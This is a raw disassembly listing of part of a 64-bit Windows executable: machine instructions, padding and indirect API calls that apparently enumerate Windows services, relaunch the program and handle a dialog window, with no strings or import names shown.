   1400017ce:	cc                   	int3
   1400017cf:	cc                   	int3
   1400017d0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1400017d5:	57                   	push   %rdi
   1400017d6:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   1400017dd:	c7 44 24 68 00 00 00 	movl   $0x0,0x68(%rsp)
   1400017e4:	00 
   1400017e5:	48 c7 44 24 50 00 00 	movq   $0x0,0x50(%rsp)
   1400017ec:	00 00 
   1400017ee:	c7 44 24 58 00 00 00 	movl   $0x0,0x58(%rsp)
   1400017f5:	00 
   1400017f6:	c7 44 24 60 00 00 00 	movl   $0x0,0x60(%rsp)
   1400017fd:	00 
   1400017fe:	c7 44 24 64 00 00 00 	movl   $0x0,0x64(%rsp)
   140001805:	00 
   140001806:	c7 44 24 5c 00 00 00 	movl   $0x0,0x5c(%rsp)
   14000180d:	00 
   14000180e:	48 c7 44 24 70 00 00 	movq   $0x0,0x70(%rsp)
   140001815:	00 00 
   140001817:	41 b8 05 00 00 00    	mov    $0x5,%r8d
   14000181d:	33 d2                	xor    %edx,%edx
   14000181f:	33 c9                	xor    %ecx,%ecx
   140001821:	ff 15 e9 67 00 00    	call   *0x67e9(%rip)        # 0x140008010
   140001827:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000182c:	48 83 7c 24 50 00    	cmpq   $0x0,0x50(%rsp)
   140001832:	75 07                	jne    0x14000183b
   140001834:	33 c0                	xor    %eax,%eax
   140001836:	e9 a3 01 00 00       	jmp    0x1400019de
   14000183b:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   140001842:	00 00 
   140001844:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   14000184b:	00 00 
   14000184d:	48 8d 44 24 5c       	lea    0x5c(%rsp),%rax
   140001852:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140001857:	48 8d 44 24 64       	lea    0x64(%rsp),%rax
   14000185c:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001861:	8b 44 24 60          	mov    0x60(%rsp),%eax
   140001865:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140001869:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001870:	00 00 
   140001872:	41 b9 03 00 00 00    	mov    $0x3,%r9d
   140001878:	41 b8 30 00 00 00    	mov    $0x30,%r8d
   14000187e:	33 d2                	xor    %edx,%edx
   140001880:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001885:	ff 15 8d 67 00 00    	call   *0x678d(%rip)        # 0x140008018
   14000188b:	8b 44 24 64          	mov    0x64(%rsp),%eax
   14000188f:	48 83 c0 38          	add    $0x38,%rax
   140001893:	89 44 24 60          	mov    %eax,0x60(%rsp)
   140001897:	8b 44 24 60          	mov    0x60(%rsp),%eax
   14000189b:	8b c8                	mov    %eax,%ecx
   14000189d:	e8 8a 05 00 00       	call   0x140001e2c
   1400018a2:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   1400018a7:	48 83 7c 24 78 00    	cmpq   $0x0,0x78(%rsp)
   1400018ad:	75 07                	jne    0x1400018b6
   1400018af:	33 c0                	xor    %eax,%eax
   1400018b1:	e9 28 01 00 00       	jmp    0x1400019de
   1400018b6:	8b 44 24 60          	mov    0x60(%rsp),%eax
   1400018ba:	48 89 84 24 88 00 00 	mov    %rax,0x88(%rsp)
   1400018c1:	00 
   1400018c2:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   1400018c7:	33 c0                	xor    %eax,%eax
   1400018c9:	48 8b 8c 24 88 00 00 	mov    0x88(%rsp),%rcx
   1400018d0:	00 
   1400018d1:	f3 aa                	rep stos %al,(%rdi)
   1400018d3:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   1400018da:	00 00 
   1400018dc:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   1400018e3:	00 00 
   1400018e5:	48 8d 44 24 5c       	lea    0x5c(%rsp),%rax
   1400018ea:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400018ef:	48 8d 44 24 64       	lea    0x64(%rsp),%rax
   1400018f4:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400018f9:	8b 44 24 60          	mov    0x60(%rsp),%eax
   1400018fd:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140001901:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   140001906:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000190b:	41 b9 03 00 00 00    	mov    $0x3,%r9d
   140001911:	41 b8 30 00 00 00    	mov    $0x30,%r8d
   140001917:	33 d2                	xor    %edx,%edx
   140001919:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   14000191e:	ff 15 f4 66 00 00    	call   *0x66f4(%rip)        # 0x140008018
   140001924:	89 44 24 68          	mov    %eax,0x68(%rsp)
   140001928:	83 7c 24 68 00       	cmpl   $0x0,0x68(%rsp)
   14000192d:	75 1c                	jne    0x14000194b
   14000192f:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001934:	ff 15 e6 66 00 00    	call   *0x66e6(%rip)        # 0x140008020
   14000193a:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   14000193f:	e8 a8 04 00 00       	call   0x140001dec
   140001944:	33 c0                	xor    %eax,%eax
   140001946:	e9 93 00 00 00       	jmp    0x1400019de
   14000194b:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001950:	ff 15 ca 66 00 00    	call   *0x66ca(%rip)        # 0x140008020
   140001956:	89 44 24 68          	mov    %eax,0x68(%rsp)
   14000195a:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   14000195f:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140001964:	c7 84 24 80 00 00 00 	movl   $0x0,0x80(%rsp)
   14000196b:	00 00 00 00 
   14000196f:	eb 10                	jmp    0x140001981
   140001971:	8b 84 24 80 00 00 00 	mov    0x80(%rsp),%eax
   140001978:	ff c0                	inc    %eax
   14000197a:	89 84 24 80 00 00 00 	mov    %eax,0x80(%rsp)
   140001981:	8b 44 24 5c          	mov    0x5c(%rsp),%eax
   140001985:	39 84 24 80 00 00 00 	cmp    %eax,0x80(%rsp)
   14000198c:	73 4c                	jae    0x1400019da
   14000198e:	8b 84 24 80 00 00 00 	mov    0x80(%rsp),%eax
   140001995:	48 6b c0 38          	imul   $0x38,%rax,%rax
   140001999:	48 8b 94 24 a0 00 00 	mov    0xa0(%rsp),%rdx
   1400019a0:	00 
   1400019a1:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   1400019a6:	48 8b 0c 01          	mov    (%rcx,%rax,1),%rcx
   1400019aa:	ff 15 c8 66 00 00    	call   *0x66c8(%rip)        # 0x140008078
   1400019b0:	85 c0                	test   %eax,%eax
   1400019b2:	75 24                	jne    0x1400019d8
   1400019b4:	8b 84 24 80 00 00 00 	mov    0x80(%rsp),%eax
   1400019bb:	48 6b c0 38          	imul   $0x38,%rax,%rax
   1400019bf:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   1400019c4:	8b 44 01 2c          	mov    0x2c(%rcx,%rax,1),%eax
   1400019c8:	89 44 24 58          	mov    %eax,0x58(%rsp)
   1400019cc:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   1400019d1:	e8 16 04 00 00       	call   0x140001dec
   1400019d6:	eb 02                	jmp    0x1400019da
   1400019d8:	eb 97                	jmp    0x140001971
   1400019da:	8b 44 24 58          	mov    0x58(%rsp),%eax
   1400019de:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   1400019e5:	5f                   	pop    %rdi
   1400019e6:	c3                   	ret
   1400019e7:	cc                   	int3
   1400019e8:	cc                   	int3
   1400019e9:	cc                   	int3
   1400019ea:	cc                   	int3
   1400019eb:	cc                   	int3
   1400019ec:	cc                   	int3
   1400019ed:	cc                   	int3
   1400019ee:	cc                   	int3
   1400019ef:	cc                   	int3
   1400019f0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1400019f5:	48 83 ec 58          	sub    $0x58,%rsp
   1400019f9:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400019ff:	33 d2                	xor    %edx,%edx
   140001a01:	33 c9                	xor    %ecx,%ecx
   140001a03:	ff 15 07 66 00 00    	call   *0x6607(%rip)        # 0x140008010
   140001a09:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001a0e:	41 b8 ff 01 0f 00    	mov    $0xf01ff,%r8d
   140001a14:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140001a19:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140001a1e:	ff 15 04 66 00 00    	call   *0x6604(%rip)        # 0x140008028
   140001a24:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001a29:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140001a2e:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140001a33:	ff 15 c7 65 00 00    	call   *0x65c7(%rip)        # 0x140008000
   140001a39:	45 33 c0             	xor    %r8d,%r8d
   140001a3c:	33 d2                	xor    %edx,%edx
   140001a3e:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140001a43:	ff 15 bf 65 00 00    	call   *0x65bf(%rip)        # 0x140008008
   140001a49:	33 c0                	xor    %eax,%eax
   140001a4b:	48 83 c4 58          	add    $0x58,%rsp
   140001a4f:	c3                   	ret
   140001a50:	40 57                	rex push %rdi
   140001a52:	48 81 ec b0 06 00 00 	sub    $0x6b0,%rsp
   140001a59:	33 c0                	xor    %eax,%eax
   140001a5b:	66 89 84 24 a0 04 00 	mov    %ax,0x4a0(%rsp)
   140001a62:	00 
   140001a63:	48 8d 84 24 a2 04 00 	lea    0x4a2(%rsp),%rax
   140001a6a:	00 
   140001a6b:	48 8b f8             	mov    %rax,%rdi
   140001a6e:	33 c0                	xor    %eax,%eax
   140001a70:	b9 06 02 00 00       	mov    $0x206,%ecx
   140001a75:	f3 aa                	rep stos %al,(%rdi)
   140001a77:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140001a7d:	48 8d 94 24 a0 04 00 	lea    0x4a0(%rsp),%rdx
   140001a84:	00 
   140001a85:	33 c9                	xor    %ecx,%ecx
   140001a87:	ff 15 4b 66 00 00    	call   *0x664b(%rip)        # 0x1400080d8
   140001a8d:	33 c0                	xor    %eax,%eax
   140001a8f:	66 89 84 24 90 00 00 	mov    %ax,0x90(%rsp)
   140001a96:	00 
   140001a97:	48 8d 84 24 92 00 00 	lea    0x92(%rsp),%rax
   140001a9e:	00 
   140001a9f:	48 8b f8             	mov    %rax,%rdi
   140001aa2:	33 c0                	xor    %eax,%eax
   140001aa4:	b9 0e 04 00 00       	mov    $0x40e,%ecx
   140001aa9:	f3 aa                	rep stos %al,(%rdi)
   140001aab:	4c 8d 84 24 a0 04 00 	lea    0x4a0(%rsp),%r8
   140001ab2:	00 
   140001ab3:	48 8d 15 d6 68 00 00 	lea    0x68d6(%rip),%rdx        # 0x140008390
   140001aba:	48 8d 8c 24 90 00 00 	lea    0x90(%rsp),%rcx
   140001ac1:	00 
   140001ac2:	ff 15 00 68 00 00    	call   *0x6800(%rip)        # 0x1400082c8
   140001ac8:	c7 44 24 20 70 00 00 	movl   $0x70,0x20(%rsp)
   140001acf:	00 
   140001ad0:	48 8d 44 24 24       	lea    0x24(%rsp),%rax
   140001ad5:	48 8b f8             	mov    %rax,%rdi
   140001ad8:	33 c0                	xor    %eax,%eax
   140001ada:	b9 6c 00 00 00       	mov    $0x6c,%ecx
   140001adf:	f3 aa                	rep stos %al,(%rdi)
   140001ae1:	48 8d 05 e8 68 00 00 	lea    0x68e8(%rip),%rax        # 0x1400083d0
   140001ae8:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140001aed:	48 8d 84 24 90 00 00 	lea    0x90(%rsp),%rax
   140001af4:	00 
   140001af5:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001afa:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%rsp)
   140001b01:	00 
   140001b02:	c7 44 24 24 40 00 00 	movl   $0x40,0x24(%rsp)
   140001b09:	00 
   140001b0a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001b0f:	ff 15 2b 67 00 00    	call   *0x672b(%rip)        # 0x140008240
   140001b15:	33 c9                	xor    %ecx,%ecx
   140001b17:	ff 15 c3 65 00 00    	call   *0x65c3(%rip)        # 0x1400080e0
   140001b1d:	48 81 c4 b0 06 00 00 	add    $0x6b0,%rsp
   140001b24:	5f                   	pop    %rdi
   140001b25:	c3                   	ret
   140001b26:	cc                   	int3
   140001b27:	cc                   	int3
   140001b28:	cc                   	int3
   140001b29:	cc                   	int3
   140001b2a:	cc                   	int3
   140001b2b:	cc                   	int3
   140001b2c:	cc                   	int3
   140001b2d:	cc                   	int3
   140001b2e:	cc                   	int3
   140001b2f:	cc                   	int3
   140001b30:	89 54 24 10          	mov    %edx,0x10(%rsp)
   140001b34:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140001b39:	48 83 ec 78          	sub    $0x78,%rsp
   140001b3d:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   140001b44:	00 
   140001b45:	48 89 05 3c a4 00 00 	mov    %rax,0xa43c(%rip)        # 0x14000bf88
   140001b4c:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   140001b53:	00 00 
   140001b55:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   140001b5c:	00 
   140001b5d:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001b62:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   140001b69:	00 00 
   140001b6b:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   140001b72:	00 00 
   140001b74:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
   140001b7b:	00 
   140001b7c:	c7 44 24 30 00 00 00 	movl   $0x80000000,0x30(%rsp)
   140001b83:	80 
   140001b84:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140001b8b:	00 
   140001b8c:	c7 44 24 20 00 00 00 	movl   $0x80000000,0x20(%rsp)
   140001b93:	80 
   140001b94:	41 b9 00 00 cf 00    	mov    $0xcf0000,%r9d
   140001b9a:	4c 8d 05 ef a3 00 00 	lea    0xa3ef(%rip),%r8        # 0x14000bf90
   140001ba1:	48 8d 15 18 a3 00 00 	lea    0xa318(%rip),%rdx        # 0x14000bec0
   140001ba8:	33 c9                	xor    %ecx,%ecx
   140001baa:	ff 15 00 67 00 00    	call   *0x6700(%rip)        # 0x1400082b0
   140001bb0:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140001bb5:	48 83 7c 24 60 00    	cmpq   $0x0,0x60(%rsp)
   140001bbb:	75 04                	jne    0x140001bc1
   140001bbd:	33 c0                	xor    %eax,%eax
   140001bbf:	eb 22                	jmp    0x140001be3
   140001bc1:	8b 94 24 88 00 00 00 	mov    0x88(%rsp),%edx
   140001bc8:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140001bcd:	ff 15 e5 66 00 00    	call   *0x66e5(%rip)        # 0x1400082b8
   140001bd3:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140001bd8:	ff 15 e2 66 00 00    	call   *0x66e2(%rip)        # 0x1400082c0
   140001bde:	b8 01 00 00 00       	mov    $0x1,%eax
   140001be3:	48 83 c4 78          	add    $0x78,%rsp
   140001be7:	c3                   	ret
   140001be8:	cc                   	int3
   140001be9:	cc                   	int3
   140001bea:	cc                   	int3
   140001beb:	cc                   	int3
   140001bec:	cc                   	int3
   140001bed:	cc                   	int3
   140001bee:	cc                   	int3
   140001bef:	cc                   	int3
   140001bf0:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140001bf5:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140001bfa:	89 54 24 10          	mov    %edx,0x10(%rsp)
   140001bfe:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140001c03:	48 81 ec a8 00 00 00 	sub    $0xa8,%rsp
   140001c0a:	8b 84 24 b8 00 00 00 	mov    0xb8(%rsp),%eax
   140001c11:	89 84 24 90 00 00 00 	mov    %eax,0x90(%rsp)
   140001c18:	83 bc 24 90 00 00 00 	cmpl   $0x2,0x90(%rsp)
   140001c1f:	02 
   140001c20:	0f 84 f3 00 00 00    	je     0x140001d19
   140001c26:	83 bc 24 90 00 00 00 	cmpl   $0xf,0x90(%rsp)
   140001c2d:	0f 
   140001c2e:	0f 84 b5 00 00 00    	je     0x140001ce9
   140001c34:	81 bc 24 90 00 00 00 	cmpl   $0x111,0x90(%rsp)
   140001c3b:	11 01 00 00 
   140001c3f:	74 05                	je     0x140001c46
   140001c41:	e9 dd 00 00 00       	jmp    0x140001d23
   140001c46:	48 8b 84 24 c0 00 00 	mov    0xc0(%rsp),%rax
   140001c4d:	00 
   140001c4e:	48 25 ff ff 00 00    	and    $0xffff,%rax
   140001c54:	0f b7 c0             	movzwl %ax,%eax
   140001c57:	89 84 24 80 00 00 00 	mov    %eax,0x80(%rsp)
   140001c5e:	48 8b 84 24 c0 00 00 	mov    0xc0(%rsp),%rax
   140001c65:	00 
   140001c66:	48 c1 e8 10          	shr    $0x10,%rax
   140001c6a:	48 25 ff ff 00 00    	and    $0xffff,%rax
   140001c70:	0f b7 c0             	movzwl %ax,%eax
   140001c73:	89 84 24 84 00 00 00 	mov    %eax,0x84(%rsp)
   140001c7a:	8b 84 24 80 00 00 00 	mov    0x80(%rsp),%eax
   140001c81:	89 84 24 94 00 00 00 	mov    %eax,0x94(%rsp)
   140001c88:	83 bc 24 94 00 00 00 	cmpl   $0x68,0x94(%rsp)
   140001c8f:	68 
   140001c90:	74 02                	je     0x140001c94
   140001c92:	eb 2c                	jmp    0x140001cc0
   140001c94:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001c9b:	00 00 
   140001c9d:	4c 8d 0d bc 00 00 00 	lea    0xbc(%rip),%r9        # 0x140001d60
   140001ca4:	4c 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%r8
   140001cab:	00 
   140001cac:	ba 67 00 00 00       	mov    $0x67,%edx
   140001cb1:	48 8b 0d d0 a2 00 00 	mov    0xa2d0(%rip),%rcx        # 0x14000bf88
   140001cb8:	ff 15 ca 65 00 00    	call   *0x65ca(%rip)        # 0x140008288
   140001cbe:	eb 27                	jmp    0x140001ce7
   140001cc0:	4c 8b 8c 24 c8 00 00 	mov    0xc8(%rsp),%r9
   140001cc7:	00 
   140001cc8:	4c 8b 84 24 c0 00 00 	mov    0xc0(%rsp),%r8
   140001ccf:	00 
   140001cd0:	8b 94 24 b8 00 00 00 	mov    0xb8(%rsp),%edx
   140001cd7:	48 8b 8c 24 b0 00 00 	mov    0xb0(%rsp),%rcx
   140001cde:	00 
   140001cdf:	ff 15 ab 65 00 00    	call   *0x65ab(%rip)        # 0x140008290
   140001ce5:	eb 65                	jmp    0x140001d4c
   140001ce7:	eb 61                	jmp    0x140001d4a
   140001ce9:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140001cee:	48 8b 8c 24 b0 00 00 	mov    0xb0(%rsp),%rcx
   140001cf5:	00 
   140001cf6:	ff 15 9c 65 00 00    	call   *0x659c(%rip)        # 0x140008298
   140001cfc:	48 89 84 24 88 00 00 	mov    %rax,0x88(%rsp)
   140001d03:	00 
   140001d04:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140001d09:	48 8b 8c 24 b0 00 00 	mov    0xb0(%rsp),%rcx
   140001d10:	00 
   140001d11:	ff 15 89 65 00 00    	call   *0x6589(%rip)        # 0x1400082a0
   140001d17:	eb 31                	jmp    0x140001d4a
   140001d19:	33 c9                	xor    %ecx,%ecx
   140001d1b:	ff 15 57 65 00 00    	call   *0x6557(%rip)        # 0x140008278
   140001d21:	eb 27                	jmp    0x140001d4a
   140001d23:	4c 8b 8c 24 c8 00 00 	mov    0xc8(%rsp),%r9
   140001d2a:	00 
   140001d2b:	4c 8b 84 24 c0 00 00 	mov    0xc0(%rsp),%r8
   140001d32:	00 
   140001d33:	8b 94 24 b8 00 00 00 	mov    0xb8(%rsp),%edx
   140001d3a:	48 8b 8c 24 b0 00 00 	mov    0xb0(%rsp),%rcx
   140001d41:	00 
   140001d42:	ff 15 48 65 00 00    	call   *0x6548(%rip)        # 0x140008290
   140001d48:	eb 02                	jmp    0x140001d4c
   140001d4a:	33 c0                	xor    %eax,%eax
   140001d4c:	48 81 c4 a8 00 00 00 	add    $0xa8,%rsp
   140001d53:	c3                   	ret
   140001d54:	cc                   	int3
   140001d55:	cc                   	int3
   140001d56:	cc                   	int3
   140001d57:	cc                   	int3
   140001d58:	cc                   	int3
   140001d59:	cc                   	int3
   140001d5a:	cc                   	int3
   140001d5b:	cc                   	int3
   140001d5c:	cc                   	int3
   140001d5d:	cc                   	int3
   140001d5e:	cc                   	int3
   140001d5f:	cc                   	int3
   140001d60:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140001d65:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140001d6a:	89 54 24 10          	mov    %edx,0x10(%rsp)
   140001d6e:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140001d73:	48 83 ec 38          	sub    $0x38,%rsp
   140001d77:	8b 44 24 48          	mov    0x48(%rsp),%eax
   140001d7b:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140001d7f:	81 7c 24 20 10 01 00 	cmpl   $0x110,0x20(%rsp)
   140001d86:	00 
   140001d87:	74 0c                	je     0x140001d95
   140001d89:	81 7c 24 20 11 01 00 	cmpl   $0x111,0x20(%rsp)
   140001d90:	00 
   140001d91:	74 09                	je     0x140001d9c
   140001d93:	eb 4f                	jmp    0x140001de4
   140001d95:	b8 01 00 00 00       	mov    $0x1,%eax
   140001d9a:	eb 4a                	jmp    0x140001de6
   140001d9c:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140001da1:	48 25 ff ff 00 00    	and    $0xffff,%rax
   140001da7:	0f b7 c0             	movzwl %ax,%eax
   140001daa:	83 f8 01             	cmp    $0x1,%eax
   140001dad:	74 13                	je     0x140001dc2
   140001daf:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140001db4:	48 25 ff ff 00 00    	and    $0xffff,%rax
   140001dba:	0f b7 c0             	movzwl %ax,%eax
   140001dbd:	83 f8 02             	cmp    $0x2,%eax
   140001dc0:	75 22                	jne    0x140001de4
   140001dc2:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140001dc7:	48 25 ff ff 00 00    	and    $0xffff,%rax
   140001dcd:	0f b7 c0             	movzwl %ax,%eax
   140001dd0:	8b d0                	mov    %eax,%edx
   140001dd2:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140001dd7:	ff 15 a3 64 00 00    	call   *0x64a3(%rip)        # 0x140008280
   140001ddd:	b8 01 00 00 00       	mov    $0x1,%eax
   140001de2:	eb 02                	jmp    0x140001de6
   140001de4:	33 c0                	xor    %eax,%eax
   140001de6:	48 83 c4 38          	add    $0x38,%rsp
   140001dea:	c3                   	ret
   140001deb:	cc                   	int3
   140001dec:	48 85 c9             	test   %rcx,%rcx
   140001def:	74 37                	je     0x140001e28
   140001df1:	53                   	push   %rbx
   140001df2:	48 83 ec 20          	sub    $0x20,%rsp
   140001df6:	4c 8b c1             	mov    %rcx,%r8
   140001df9:	48 8b 0d 70 a2 00 00 	mov    0xa270(%rip),%rcx        # 0x14000c070
   140001e00:	33 d2                	xor    %edx,%edx
   140001e02:	ff 15 20 63 00 00    	call   *0x6320(%rip)        # 0x140008128
   140001e08:	85 c0                	test   %eax,%eax
   140001e0a:	75 17                	jne    0x140001e23
   140001e0c:	e8 cb 02 00 00       	call   0x1400020dc
   140001e11:	48 8b d8             	mov    %rax,%rbx
   140001e14:	ff 15 06 63 00 00    	call   *0x6306(%rip)        # 0x140008120
   140001e1a:	8b c8                	mov    %eax,%ecx
   140001e1c:	e8 73 02 00 00       	call   0x140002094
   140001e21:	89 03                	mov    %eax,(%rbx)
   140001e23:	48 83 c4 20          	add    $0x20,%rsp
   140001e27:	5b                   	pop    %rbx
   140001e28:	c3                   	ret
   140001e29:	cc                   	int3
   140001e2a:	cc                   	int3
   140001e2b:	cc                   	int3
   140001e2c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001e31:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140001e36:	57                   	push   %rdi
   140001e37:	48 83 ec 20          	sub    $0x20,%rsp
   140001e3b:	48 8b d9             	mov    %rcx,%rbx
   140001e3e:	48 83 f9 e0          	cmp    $0xffffffffffffffe0,%rcx
   140001e42:	77 7c                	ja     0x140001ec0
   140001e44:	bf 01 00 00 00       	mov    $0x1,%edi
   140001e49:	48 85 c9             	test   %rcx,%rcx
   140001e4c:	48 0f 45 f9          	cmovne %rcx,%rdi
   140001e50:	48 8b 0d 19 a2 00 00 	mov    0xa219(%rip),%rcx        # 0x14000c070
   140001e57:	48 85 c9             	test   %rcx,%rcx
   140001e5a:	75 20                	jne    0x140001e7c
   140001e5c:	e8 3f 09 00 00       	call   0x1400027a0
   140001e61:	b9 1e 00 00 00       	mov    $0x1e,%ecx
   140001e66:	e8 d5 06 00 00       	call   0x140002540
   140001e6b:	b9 ff 00 00 00       	mov    $0xff,%ecx
   140001e70:	e8 1b 03 00 00       	call   0x140002190
   140001e75:	48 8b 0d f4 a1 00 00 	mov    0xa1f4(%rip),%rcx        # 0x14000c070
   140001e7c:	4c 8b c7             	mov    %rdi,%r8
   140001e7f:	33 d2                	xor    %edx,%edx
   140001e81:	ff 15 a9 62 00 00    	call   *0x62a9(%rip)        # 0x140008130
   140001e87:	48 8b f0             	mov    %rax,%rsi
   140001e8a:	48 85 c0             	test   %rax,%rax
   140001e8d:	75 2c                	jne    0x140001ebb
   140001e8f:	39 05 6b a8 00 00    	cmp    %eax,0xa86b(%rip)        # 0x14000c700
   140001e95:	74 0e                	je     0x140001ea5
   140001e97:	48 8b cb             	mov    %rbx,%rcx
   140001e9a:	e8 4d 09 00 00       	call   0x1400027ec
   140001e9f:	85 c0                	test   %eax,%eax
   140001ea1:	74 0d                	je     0x140001eb0
   140001ea3:	eb ab                	jmp    0x140001e50
   140001ea5:	e8 32 02 00 00       	call   0x1400020dc
   140001eaa:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   140001eb0:	e8 27 02 00 00       	call   0x1400020dc
   140001eb5:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   140001ebb:	48 8b c6             	mov    %rsi,%rax
   140001ebe:	eb 12                	jmp    0x140001ed2
   140001ec0:	e8 27 09 00 00       	call   0x1400027ec
   140001ec5:	e8 12 02 00 00       	call   0x1400020dc
   140001eca:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   140001ed0:	33 c0                	xor    %eax,%eax
   140001ed2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001ed7:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140001edc:	48 83 c4 20          	add    $0x20,%rsp
   140001ee0:	5f                   	pop    %rdi
   140001ee1:	c3                   	ret
   140001ee2:	cc                   	int3
   140001ee3:	cc                   	int3
   140001ee4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001ee9:	57                   	push   %rdi
   140001eea:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   140001ef1:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001ef6:	ff 15 44 62 00 00    	call   *0x6244(%rip)        # 0x140008140
   140001efc:	41 bb 4d 5a 00 00    	mov    $0x5a4d,%r11d
   140001f02:	48 8d 3d f7 e0 ff ff 	lea    -0x1f09(%rip),%rdi        # 0x140000000
   140001f09:	66 44 39 1d ef e0 ff 	cmp    %r11w,-0x1f11(%rip)        # 0x140000000
   140001f10:	ff 
   140001f11:	74 04                	je     0x140001f17
   140001f13:	33 db                	xor    %ebx,%ebx
   140001f15:	eb 31                	jmp    0x140001f48
   140001f17:	48 63 05 1e e1 ff ff 	movslq -0x1ee2(%rip),%rax        # 0x14000003c
   140001f1e:	48 03 c7             	add    %rdi,%rax
   140001f21:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   140001f27:	75 ea                	jne    0x140001f13
   140001f29:	b9 0b 02 00 00       	mov    $0x20b,%ecx
   140001f2e:	66 39 48 18          	cmp    %cx,0x18(%rax)
   140001f32:	75 df                	jne    0x140001f13
   140001f34:	33 db                	xor    %ebx,%ebx
   140001f36:	83 b8 84 00 00 00 0e 	cmpl   $0xe,0x84(%rax)
   140001f3d:	76 09                	jbe    0x140001f48
   140001f3f:	39 98 f8 00 00 00    	cmp    %ebx,0xf8(%rax)
   140001f45:	0f 95 c3             	setne  %bl
   140001f48:	89 9c 24 b0 00 00 00 	mov    %ebx,0xb0(%rsp)
   140001f4f:	e8 a8 01 00 00       	call   0x1400020fc
   140001f54:	85 c0                	test   %eax,%eax
   140001f56:	75 22                	jne    0x140001f7a
   140001f58:	83 3d 09 a1 00 00 01 	cmpl   $0x1,0xa109(%rip)        # 0x14000c068
   140001f5f:	75 05                	jne    0x140001f66
   140001f61:	e8 3a 08 00 00       	call   0x1400027a0
   140001f66:	b9 1c 00 00 00       	mov    $0x1c,%ecx
   140001f6b:	e8 d0 05 00 00       	call   0x140002540
   140001f70:	b9 ff 00 00 00       	mov    $0xff,%ecx
   140001f75:	e8 16 02 00 00       	call   0x140002190
   140001f7a:	e8 79 17 00 00       	call   0x1400036f8
   140001f7f:	85 c0                	test   %eax,%eax
   140001f81:	75 22                	jne    0x140001fa5
